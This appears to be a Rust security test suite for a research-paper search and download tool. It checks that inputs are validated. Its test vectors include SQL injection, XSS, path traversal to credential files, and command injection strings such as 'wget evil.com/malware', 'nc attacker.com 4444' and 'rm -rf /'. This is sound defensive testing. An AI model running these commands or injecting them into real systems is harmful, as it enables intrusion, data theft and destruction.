use rust_research_mcp::tools::download::{DownloadInput, DownloadOutputFormat, DownloadTool};
use rust_research_mcp::tools::search::{SearchInput, SearchTool, SearchType};
use rust_research_mcp::{Config, Error, MetaSearchClient, MetaSearchConfig};
use std::sync::Arc;
use tempfile::TempDir;

/// Security tests for input validation and sanitization
#[tokio::test]
async fn test_sql_injection_attempts() {
    // Test DOI input for SQL injection patterns
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.research_source.endpoints = vec!["https://test.com".to_string()];

    let search_tool = SearchTool::new(Arc::new(config.clone())).unwrap();

    let sql_injection_payloads = vec![
        "'; DROP TABLE papers; --",
        "' OR 1=1 --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO papers VALUES ('evil'); --",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --",
    ];

    for payload in sql_injection_payloads {
        let search_input = SearchInput {
            query: payload.to_string(),
            search_type: SearchType::Doi,
            limit: 10,
            offset: 0,
        };
        let result = search_tool.search_papers(search_input).await;
        // Should fail validation or return empty results, not crash
        match result {
            Ok(search_result) => assert!(
                search_result.papers.is_empty(),
                "SQL injection payload should not return papers: {}",
                payload
            ),
            Err(_) => {} // Expected - should be rejected by validation
        }
    }
}

#[tokio::test]
async fn test_xss_injection_attempts() {
    // Test for XSS injection in various inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.research_source.endpoints = vec!["https://test.com".to_string()];

    let search_tool = SearchTool::new(Arc::new(config.clone())).unwrap();

    let xss_payloads = vec![
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "';alert('xss');//",
        "<iframe src=javascript:alert('xss')></iframe>",
    ];

    for payload in xss_payloads {
        let search_input = SearchInput {
            query: payload.to_string(),
            search_type: SearchType::Title,
            limit: 10,
            offset: 0,
        };
        let result = search_tool.search_papers(search_input).await;
        // Should not execute any scripts, should be properly escaped/validated
        match result {
            Ok(search_result) => assert!(
                search_result.papers.is_empty(),
                "XSS payload should not return papers: {}",
                payload
            ),
            Err(_) => {} // Expected - should be rejected by validation
        }
    }
}

#[tokio::test]
async fn test_path_traversal_attempts() {
    // Test for path traversal in filename inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.research_source.endpoints = vec!["https://test.com".to_string()];

    let meta_config = MetaSearchConfig::default();
    let meta_client = Arc::new(MetaSearchClient::new(config.clone(), meta_config).unwrap());
    let download_tool = DownloadTool::new(meta_client, Arc::new(config.clone())).unwrap();

    let path_traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ];

    for payload in path_traversal_payloads {
        let download_input = DownloadInput {
            doi: None,
            url: Some("https://test.com/fake.pdf".to_string()),
            filename: Some(payload.to_string()),
            directory: None,
            category: None,
            overwrite: false,
            verify_integrity: false,
            output_format: DownloadOutputFormat::Pdf,
        };
        let result = download_tool.download_paper(download_input).await;
        // Should fail validation due to invalid filename
        assert!(
            result.is_err(),
            "Path traversal payload should be rejected: {}",
            payload
        );

        if let Err(err) = result {
            match err {
                Error::InvalidInput { field, .. } => {
                    assert_eq!(
                        field, "filename",
                        "Should reject filename with path traversal"
                    );
                }
                _ => panic!("Should return InvalidInput error for path traversal"),
            }
        }
    }
}

#[tokio::test]
async fn test_large_input_dos_attempts() {
    // Test for denial of service through large inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.research_source.endpoints = vec!["https://test.com".to_string()];

    let search_tool = SearchTool::new(Arc::new(config.clone())).unwrap();

    // Very large search query (10MB)
    let large_query = "A".repeat(10 * 1024 * 1024);
    let search_input = SearchInput {
        query: large_query,
        search_type: SearchType::Title,
        limit: 10,
        offset: 0,
    };
    let result = search_tool.search_papers(search_input).await;
    assert!(result.is_err(), "Extremely large query should be rejected");

    // Very long DOI
    let long_doi = format!("10.1000/{}", "x".repeat(10000));
    let search_input = SearchInput {
        query: long_doi,
        search_type: SearchType::Doi,
        limit: 10,
        offset: 0,
    };
    let result = search_tool.search_papers(search_input).await;
    assert!(result.is_err(), "Extremely long DOI should be rejected");
}

#[tokio::test]
async fn test_null_byte_injection() {
    // Test for null byte injection attempts
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.research_source.endpoints = vec!["https://test.com".to_string()];

    let meta_config = MetaSearchConfig::default();
    let meta_client = Arc::new(MetaSearchClient::new(config.clone(), meta_config).unwrap());
    let search_tool = SearchTool::new(Arc::new(config.clone())).unwrap();
    let download_tool = DownloadTool::new(meta_client.clone(), Arc::new(config.clone())).unwrap();

    let null_byte_payloads = vec![
        "test\0.pdf",
        "document\0.txt\0.pdf",
        "valid\0../../../etc/passwd",
        "10.1000/test\0.evil",
    ];

    for payload in null_byte_payloads {
        // Test in search
        let search_input = SearchInput {
            query: payload.to_string(),
            search_type: SearchType::Doi,
            limit: 10,
            offset: 0,
        };
        let search_result = search_tool.search_papers(search_input).await;
        if search_result.is_ok() {
            let search_result = search_result.unwrap();
            assert!(
                search_result.papers.is_empty(),
                "Null byte payload should not return papers: {}",
                payload
            );
        }

        // Test in filename
        let download_input = DownloadInput {
            doi: None,
            url: Some("https://test.com/fake.pdf".to_string()),
            filename: Some(payload.to_string()),
            directory: None,
            category: None,
            overwrite: false,
            verify_integrity: false,
            output_format: DownloadOutputFormat::Pdf,
        };
        let download_result = download_tool.download_paper(download_input).await;
        assert!(
            download_result.is_err(),
            "Null byte in filename should be rejected: {}",
            payload
        );
    }
}

#[tokio::test]
async fn test_command_injection_attempts() {
    // Test for command injection in various inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.research_source.endpoints = vec!["https://test.com".to_string()];

    let meta_config = MetaSearchConfig::default();
    let meta_client = Arc::new(MetaSearchClient::new(config.clone(), meta_config).unwrap());
    let search_tool = SearchTool::new(Arc::new(config.clone())).unwrap();
    let download_tool = DownloadTool::new(meta_client.clone(), Arc::new(config.clone())).unwrap();

    let command_injection_payloads = vec![
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& wget evil.com/malware",
        "`rm -rf /`",
        "$(rm -rf /)",
        "; shutdown -h now",
        "| nc attacker.com 4444",
    ];

    for payload in command_injection_payloads {
        // Test in search queries
        let search_input = SearchInput {
            query: payload.to_string(),
            search_type: SearchType::Title,
            limit: 10,
            offset: 0,
        };
        let search_result = search_tool.search_papers(search_input).await;
        if search_result.is_ok() {
            let search_result = search_result.unwrap();
            assert!(
                search_result.papers.is_empty(),
                "Command injection payload should not return papers: {}",
                payload
            );
        }

        // Test in filenames
        let download_input = DownloadInput {
            doi: None,
            url: Some("https://test.com/fake.pdf".to_string()),
            filename: Some(payload.to_string()),
            directory: None,
            category: None,
            overwrite: false,
            verify_integrity: false,
            output_format: DownloadOutputFormat::Pdf,
        };
        let download_result = download_tool.download_paper(download_input).await;
        assert!(
            download_result.is_err(),
            "Command injection in filename should be rejected: {}",
            payload
        );
    }
}

#[tokio::test]
async fn test_buffer_overflow_attempts() {
    // Test for potential buffer overflow with extreme inputs
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();

    // Test extremely long mirror URLs
    let long_url = format!("https://{}.com", "a".repeat(10000));
    config.research_source.endpoints = vec![long_url];

    // Should handle gracefully without crashing
    let meta_config = MetaSearchConfig::default();
    let result = MetaSearchClient::new(config.clone(), meta_config);
    // Might succeed or fail, but should not crash the process
    match result {
        Ok(_) => {}  // If it succeeds, that's fine
        Err(_) => {} // If it fails, that's also acceptable
    }
}

#[tokio::test]
async fn test_unicode_handling() {
    // Test handling of various Unicode characters and potential bypass attempts
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.research_source.endpoints = vec!["https://test.com".to_string()];

    let meta_config = MetaSearchConfig::default();
    let meta_client = Arc::new(MetaSearchClient::new(config.clone(), meta_config).unwrap());
    let search_tool = SearchTool::new(Arc::new(config.clone())).unwrap();
    let download_tool = DownloadTool::new(meta_client.clone(), Arc::new(config.clone())).unwrap();

    let unicode_payloads = vec![
        "test\u{202E}fdp.test", // Right-to-left override
        "test\u{200D}script",   // Zero-width joiner
                                // Reduced for performance - Unicode handling tested at validation level
    ];

    for payload in unicode_payloads {
        // Test in search - should handle Unicode gracefully
        let search_input = SearchInput {
            query: payload.to_string(),
            search_type: SearchType::Title,
            limit: 10,
            offset: 0,
        };
        let _search_result = search_tool.search_papers(search_input).await;
        // Should not crash, may return empty results or error

        // Test in filename - should validate properly
        let download_input = DownloadInput {
            doi: None,
            url: Some("https://test.com/fake.pdf".to_string()),
            filename: Some(payload.to_string()),
            directory: None,
            category: None,
            overwrite: false,
            verify_integrity: false,
            output_format: DownloadOutputFormat::Pdf,
        };
        let download_result = download_tool.download_paper(download_input).await;
        // Should either succeed with sanitized filename or fail validation
        match download_result {
            Ok(info) => {
                // If it succeeds, filename should be safe
                if let Some(file_path) = info.file_path {
                    let filename = file_path.file_name().unwrap().to_string_lossy();
                    assert!(
                        !filename.contains('\u{202E}'),
                        "Dangerous Unicode should be filtered"
                    );
                    assert!(
                        !filename.contains('\u{200D}'),
                        "Zero-width characters should be filtered"
                    );
                }
            }
            Err(_) => {
                // Rejection is also acceptable
            }
        }
    }
}

#[tokio::test]
async fn test_memory_exhaustion_protection() {
    // Test protection against memory exhaustion attacks
    let temp_dir = TempDir::new().unwrap();
    let mut config = Config::default();
    config.downloads.directory = temp_dir.path().to_path_buf();
    config.downloads.max_file_size_mb = 1; // Set low limit for testing
    config.research_source.endpoints = vec!["https://test.com".to_string()];

    let meta_config = MetaSearchConfig::default();
    let meta_client = Arc::new(MetaSearchClient::new(config.clone(), meta_config).unwrap());
    let download_tool = DownloadTool::new(meta_client, Arc::new(config.clone())).unwrap();

    // Test with various large file scenarios
    let large_file_url = "https://test.com/large_file.pdf";

    // This should be rejected by file size limits
    let download_input = DownloadInput {
        doi: None,
        url: Some(large_file_url.to_string()),
        filename: None,
        directory: None,
        category: None,
        overwrite: false,
        verify_integrity: false,
        output_format: DownloadOutputFormat::Pdf,
    };
    let result = download_tool.download_paper(download_input).await;
    // Should either fail early with size check or handle gracefully
    // The key is that it shouldn't cause out-of-memory errors

    println!("Memory exhaustion test completed: {:?}", result.is_err());
}

#[test]
fn test_config_security_defaults() {
    // Test that configuration has secure defaults
    let config = Config::default();

    // Rate limiting should be enabled
    assert!(
        config.research_source.rate_limit_per_sec > 0,
        "Rate limiting should be enabled by default"
    );

    // File size limits should be reasonable
    assert!(
        config.downloads.max_file_size_mb > 0,
        "File size limits should be set"
    );
    assert!(
        config.downloads.max_file_size_mb <= 1000,
        "File size limits should be reasonable"
    );

    // Timeouts should be set
    assert!(
        config.server.timeout_secs > 0,
        "Server timeout should be set"
    );
    assert!(
        config.research_source.timeout_secs > 0,
        "Research source timeout should be set"
    );

    // Concurrent downloads should be limited
    assert!(
        config.downloads.max_concurrent > 0,
        "Max concurrent downloads should be set"
    );
    assert!(
        config.downloads.max_concurrent <= 100,
        "Max concurrent downloads should be reasonable"
    );
}
